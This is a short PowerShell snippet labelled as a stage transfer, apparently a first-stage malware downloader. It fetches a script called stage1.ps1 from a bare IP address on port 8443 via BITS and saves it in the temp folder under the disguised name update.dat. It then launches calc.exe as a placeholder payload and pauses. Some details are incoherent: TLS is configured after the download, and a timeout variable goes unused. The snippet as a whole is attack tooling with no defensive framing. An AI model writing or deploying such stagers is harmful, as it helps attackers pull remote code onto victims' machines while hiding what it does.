
<# Stage transfer #> $FetchUrl = "https://198.51.100.204:8443/stage1.ps1"; $DownloadPath = "$env:TEMP\update.dat"; $StageTimeout = 136; Start-BitsTransfer -Source $FetchUrl -Destination $DownloadPath; Start-Process -FilePath "calc.exe"; Start-Sleep -Seconds 43; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
